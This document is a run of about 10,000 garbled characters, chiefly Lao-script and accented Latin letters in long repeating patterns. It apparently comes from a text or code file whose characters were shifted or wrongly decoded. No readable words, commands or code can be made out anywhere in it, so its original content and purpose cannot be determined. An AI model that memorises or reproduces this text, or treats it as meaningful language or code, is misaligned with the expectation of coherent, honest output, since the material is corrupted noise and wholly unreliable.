Ŵa຾ŸaະຶຑŷcູŸcູŷeŸdະາູųeŵd๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕŷcະໂųaŷcິຯຸŸcຓຂŸfŸeŷe຾ŹaຑັຳຯຯາິຉຼŸdືŸbຂບŲa๺ųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŷaາຽ຀ອີຮŸdŸaຓųcັຳຯຯາິຉŷcŸeŸaŸbຫີŸbຳຸųdັູຫŷdິŸeŴcອŸbŸbŸcຯາŸbູິŴaຳຳີຶųcŵbຖŸbŸdŷeະ຀ŷcຳŷfŸaືປųfາŸfŸfŸdຉສຸŷbແųfຶັົŸcຆŵfŵcຳັູ຾ŸcິິຎງົີŷbງຐຫŸaŸfທųfŸbີຳŸcųeຮŷeິຬŸcຕຑŸaາŷdŸbŵaຌŸfŷfືາຖŲc๺ųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaທŷe຿ູŸdຳະງŸbແŸfູປųfŷe຿ູŸdຳະųfųfŷdຳຫŸfŸcŵbຆŸbຸສໃົŴcະິຫŷeŴaືŷbŸcŸbຉສຼŸbŸcŸeະųaງŷeŸaŸfŴaŸbູŸbິŸeະອຑŸaູຸຶຶະຸຸŴcືŴcືູųfຆŸaາŸdŸeູŵaງŸbŸeິັຶŸaິŸcງŸdຂŵbຕŸdŸfຫຸງŷdາŷaŸcືຓųfະŷdŸeະຑŸaູຸຶຶະຸຸŴcືງຒຘຐŸdŸeŷaŸbຒŵeຐຯຽŸbຶŸbŸbŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeຓຐຬŸdຽŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀ŵeຐŷbື຿ຒ๽๻ຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງŵe຋ŷdະຼŵd๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆŸbຸສໃົŴcŷeŸeຬ຿ųfŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘŷdື຾ųdŷcŸeຫŸcŸaŵbງິŸbŷfຽເŴeຼະŸdŸdŴcŸbŸeສີີຳŴdຮຸະຶŷeະŸaິິųcŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆດຯຶໂ຀ŷcຳŷfŸaືປųfŸeŸfŷbຼŹaຉຼŸdືŸbຉູຸŷeັັາຂຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘŷdື຾ųdŷcŸeຫŸcŸaŵbງິŸbŷfຽເŴeຼະŸdŸdŴcŸbŸeສີີຳŴdູຸາຂŵbŲc๺ųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆŸdŸfŸdອາŴcŷdິŸeຶŴaິີືŸdຉຫີະັŸdຂບŲa๺ųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaທŷcັແງອŸeŷeŸaŸdŵcຂŷeŴaາາຶົຉŸdŸbຳືŸdູųaະŷfŸeŴeŴe຀ŸcຼŸaŸcະຸ຿ŴaŷdŸfŸfŸdູະŸdŴcŸdŸbຫŸcŸdຆຯັຶŸbະŴaະŸcິັŸfŴaŷdີŸfŸdູິųfŵdຖŸaາŷdŸbຆŷbັŷeືືŵaງຸູŸdŷfາŴbŸaŷaະ຀ຸຸŸdŸcŴcŸaັŷeŷcີŸbŴaຍຂŵbຜŵcລຐຸŷfŸdŸeຒທືຒŴcŴdຕຒŵdລທຑŸbŵfງŵeສງŸaŸc຺ŸeັŵaųeŷbŸcີຳິນųfັູູັŸbທຆŵfຟຠລພຕຑຯຒຘຐŸdŸeŷaŸbຒŵeຐŷbື຿ຒ๽๻ຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕຑŷbŸd຺ŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆຕຬີຽຆŷbັŷeືືŵaງŸeŸeສົົŴbຮເŸdຶຳŸbŴcŸbŸeສີີຳຆŵfŲaŲc຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆŸbຸສໃົŴcŷe຾ຶŸeຸŸaŴdຮຸະຶŷeະŸaິິųcŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງŵeສຼŸbŸcŸeະųaŸdແŸeຶŵaຂສຼŸbŸcŸeະųcງູŸcຮີŸdອິŵcųeŷaŸeŷdຶŸbຎຊųf຀ອີຮŸdŸaຓųcŷfŸcŸcŴeະິຳ຺ŸbະŴcັŷeງŷeŸaŸfŴaຸໃີຳŴbເŸdŷeŸdະųeŷbŷeຬŸbາŴcŷdŸeະŸeŷeືŸcຶŸf຀ຬŴaີິິŹaųaŷeິັິŸbຉŸdŸdິŸbŸaຉŷfາŸaŸaຶŸf຀ŸcຼŸaŸcະຸ຿ŴaŷdŸfŸfŸdູະŸdŴcŷdິະŸeາŸeųeŷbŸdະຉູູືŸcຫŸcເŴbŸdຯງສຶŸbŴcŸbະະຑ຺ືŷaູັຂຒທŸaຸຮະųaŷcິຯຸŸcຓຂຶŷaູŸdຉŸcຸŷe຿຿ŴaŹbŸaຶŸbຳງຒຘຐŸdŸeŷaŸbຒ๵๻ųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖຶຑງອŸeŷeŸaŸdŵcຂີŸbິັŸfາຉຶາແŸcງຒŴcຕຌŴaŴdຑŵe຋ັŴbŵaຕ຋ŷcຼŸcŸaŸcŸbຒ๵๻ųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀ŵeຐŷbື຿ຒ๽๻ຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕຑŷbŸd຺ŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀ŵeຐŷbື຿ຒ๽๻ຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆŸbຸສໃົŴcຽŸdŸdŸeŴaŸbŸfŷbຶŸeູŴaຯູŸbຶŸbŸaųeŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘŷdື຾ųdŷcŸeຫŸcŸaŵbງິŸbŷfຽເŴeŷcູŸeີŴcະະŸbາŴaŷdŸfິŸcຉຫŸaŸeຽŸdຶųcŵbຖŸbŸdŷeະ຀ŷcຳŷfŸaືປųfາŸfŸfŸdຉສຸŷbແųfຶັົŸcຆŵfŶaຳສຶຳຳųfຐŷdŸaຸຕųdŷcຳະŸcŸeິິŵcຘຐŸdŸeŷaŸbຒŵeŸcŸfŷfŸd຀ŷfີŷfŸbຸŵaຂŸdŷcŸeŸaŴcິŸbŷfຽເŴeະິຫເŴcŴfທŹaŴdຕųeŵcຓຐືາŷeŸdŵaŲcŲcųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆຕŸaŴeງŷdາŷaŸcືຓųfະŸaຳŸdຸາŴbŸaຶົຶ຀ັະັືຉŷfຸັŸbŴeŸfຳສຼແŴbຮັŸbຼŸaŸaųbŵbຌປຍŴfຐŴfŵeŴbັŴcŵcຓຐຬŸdຽŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŴfຯຶໂຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕຑŷbŸd຺ŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųfŵeŴbŷdື຾ŵfŲaŲc຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŷaາຽ຀ອີຮŸdŸaຓųcŸfູຮເົຉໃŸbະŸcŴcັŸbŷfືາຶŴaອຳŸbŸbŷfະະັŸfųeŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆŸbຸສໃົŴcຽŸdŸdŸeŴaŸbŸfŷbຶŸeູųfŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŷaາຽ຀ອີຮŸdŸaຓųcŸfູຮເົຉໃŸbະŸcŴcັŸbŷfືາຶŴaຶຳູງŵaŲcŲcųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀ŵeŷdະຼųfອຶŷeŸdŸbŵeųfາິຶŷaຳŴcອັີິŴdັາຸຶŴaຮິະŸbຸųfŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆດຯຶໂ຀ŷcຳŷfŸaືປųfŷcŴdືີູŹaŴaະŸaຳŸdຸາຆືŷaູຉຍງັຽŸaຶີຳແŴdຮຸະຶາŸdŸcŴcືŸeŷeŸeŸaųdŷeŸeŸdະŸdŴbະຶັŸaŸdŴdຮາະຶາູųeŵdŵeŸfູŷfŸcųdŷcŸeຫŸcŸaŵbງາŸcຶŷdີŴeŸdຫŸbງີູŸdຶຑັຳຯຯາິຉŴeງŵaຜຘŶc຋ŸaຮຸູŵfŵeŸcŵdŴfŴdŵbທຘŶbດŴcŸcຒ຀ທຯຆŸaຶ຿ີຳŵdųbŷcຳŸeຸູຘųfŸbŸcາຳŸcຒųfຒ຤Ŷfຠຟຕ຋ŷcŵbຖŴfຸູຫະŵbຕຑŷbŸd຺ŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆຕ຋ŷeຶຼŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘŷdື຾ųdŷcŸeຫŸcŸaŵbງິŸbŷfຽເŴeŷfໃຶŸdŸeŸaŴcັŸbŷfືາຶųfຒ๵๻ųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀ŵeŷdະຼųfອຶŷeŸdŸbŵeųfິຳŷf຾຺ŴcສົŸdŸcŸfŸfŴaອຳŸbŸbŷfະະັŸfųeŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ທຯຽŸbຶŸbŸbຆŸaຼູູຓųfຯຽŸbຶŸbŸbųeųeŸcŸbອŸeຶŷaີŵcຂŷfີŷfັŸeຉŴdຂງŷaິຮືŸfŵaųeຮູŸbຉŸbŸfŸeົŸbŸaຑŸaŷcųeŷbŸdະຉຳ຾ິຳຉຽຶŷcŸaີງສຫŷdຶຳŴcອŸbŸbŸcຯາŸbູິງŷbŴbີŸeັົຆຯັຶŸbະŴaະŸcິັŸfŴaŷdີŸfŸdູິງັຽŸaຶີຳແŴdຮຸະຶາŸdŸcŴcອັŸbŸcີŸbງສຶŸbŴcຸູŸdູŷeŸeົŴeŸaຬ຀ŷfŸbŸaŴcັີŸbŴbແາŷdຶŸaųfŵdຖŸaາŷdŸbຆŷbັŷeືືŵaງືŷaຳຸŴaŸeŸfŷbຼŹaຉ຺ືືŸbູųcŵbຖŴfຸູຫະŵbŲc๺ųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeຓັຎ຀ŷcຳŷfŸaືປųfືŸcັຶະູŴaŸbຳແຶųcŵbŴfຐຉŴeຊຊທŴeະŴbຒຘຐŷe຿ູŸdຳະŵbŲc๺ųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕຑŷbŸd຺ŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆຕ຋ŷeຶຼŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕຑŷbŸd຺ŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀ŵeŷdະຼųfອຶŷeŸdŸbŵeųfິຳŷf຾຺ŴcໃຸຶŸcŴdŸeຸສŸdີິŴbຯຳŸeŸdູŸdųbŵb๵Ųcງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŷaາຽ຀ອີຮŸdŸaຓųcŸfູຮເົຉອາຳິŴcŸaີະະŴdຮຸŸbືŴaຮŸbŸeໃຸŸdųeŵcຓŸcາຫŸbųfŷdຳຫŸfŸcŵbຆືຸະຶŴaຯູŷbŹdųaŸdຳເູųfຒຝຸຯືຳູųa຋ŷfŸdŸdຖ຀ອຸŸdŸdŸeŸeັນຖŴfຸູຫະŵbຕŸdŸfຫຸງŷdາŷaŸcືຓųfະŷdŸeະຑŸfູຮເົຉŸbŸfຮແŴcຍຒົŴfຖųbŵbŵe຋ŸcŸfŷfŸdຒ๽๻ຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘັŴcųeຮີຫືŸcŵcųeະະຶຶŸaີŴeŸdູŹaŸdųfະະŸbາŴaŷdŸfິŸcຉິຸຯຽແຉŷdŸaູ຿ŸfŸdຂຒŴeຐຌŴfຊŴaທຑຶຑŵbŵe຋ŷdະຼŵd๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeຓຐຬŸdຽŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆຕ຋ŷeຶຼŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaທຑŷaາຽຒ๵๻ųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeຓŷdŸdໂງŷaິຮືŸfŵaųeຸŸcŷfໃŹaŴa຾ŸaະຶຑŸaູຮາີູຉŷcŸeŸaŸbຫີŸbຳຸųbŵb๵Ųcງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀ŵeŷdະຼųfອຶŷeŸdŸbŵeųfິຳŷf຾຺ŴcໃຸຶŸcŴdŸeຸສŸdີິųeŵd๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeຓŷdŸdໂງŷaິຮືŸfŵaųeຸŸcŷfໃŹaŴa຾ŸaະຶຑŸaູຮາີູຉŸdŸeຸງຒ๽๻ຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕŷcະໂųaŷcິຯຸŸcຓຂູູືŷaູຑŷcຳາັŴaŸeູຳŸbŴbຮŸeີະŸaຆŵfŲaŲc຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆຯŴaຸŸeາແŴbະະຶຶŸaີųdະຫາŴaຐຆັໃŸfŸdືິຼŴaອຳŸbŸbຳŸdຶຑŸcŸcຯŸbŸd຀ຫີະັŸdຉີŸdຳŸdຸŴaອູŸbŸbຳູຂບທŸdŸeŷaŸb຀ອີຮŸdŸaຓųcູŸeັຮາຉຶŷeຶຆີຳຸŸdŴbຶຶŷeຬູŸfŴcŴfງຒມŵdŶeຌŸfŷfືາຖຕŸdŵdŵdŴaຑມດŴcŸcຒ຀ທຯຆŸaຶ຿ີຳŵdųbŷcຳŸeຸູຘųfŸbŸcາຳŸcຒųfຒ຤Ŷfຠຟຕ຋ŷcŵbຖŴfຸູຫະŵbຕຑŷbŸd຺ŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆຕ຋ŷeຶຼŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘŷdື຾ųdŷcŸeຫŸcŸaŵbງິŸbŷfຽເŴeŷfໃຶŸdŸeŸaŴcັŸbŷfືາຶųfຒ๵๻ųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀ŵeŷdະຼųfອຶŷeŸdŸbŵeųfິຳŷf຾຺ŴcສົŸdŸcŸfŸfŴaອຳŸbŸbŷfະະັŸfųeŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ທຯຽŸbຶŸbŸbຆŸaຼູູຓųfຯຽŸbຶŸbŸbųeųeŸcŸbອŸeຶŷaີŵcຂŷfີŷfັŸeຉŴdຂງŷaິຮືŸfŵaųeຮູŸbຉŸbŸfŸeົŸbŸaຑŸaŷcųeŷbŸdະຉຳ຾ິຳຉຽຶŷcŸaີງສຫŷdຶຳŴcອŸbŸbŸcຯາŸbູິງŷbŴbີŸeັົຆຯັຶŸbະŴaະŸcິັŸfŴaŷdີŸfŸdູິງັຽŸaຶີຳແŴdຮຸະຶາŸdŸcŴcອັŸbŸcີŸbງສຶŸbŴcຸູŸdູŷeŸeົŴeŸaຬ຀ŷfŸbŸaŴcັີŸbŴbແາŷdຶŸaųfŵdຖŸaາŷdŸbຆŷbັŷeືືŵaງືŷaຳຸŴaŸeŸfŷbຼŹaຉ຺ືືŸbູųcŵbຖŴfຸູຫະŵbŲc๺ųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeຓັຎ຀ŷcຳŷfŸaືປųfືŸcັຶະູŴaŸbຳແຶųcŵbຕຊທຑຊŵeຐືŴcŵdŵeŴbŷfຽŸaູຸະຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ທŴeŷcະໂບŲa๺ųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖŴeຬີຽŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ທŴeŷcະໂບŲa๺ųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງŵeຬຶ຿ຆŷaŸeŷdŸcŸdŵdųbŸfຳສຼແŴb຾ະ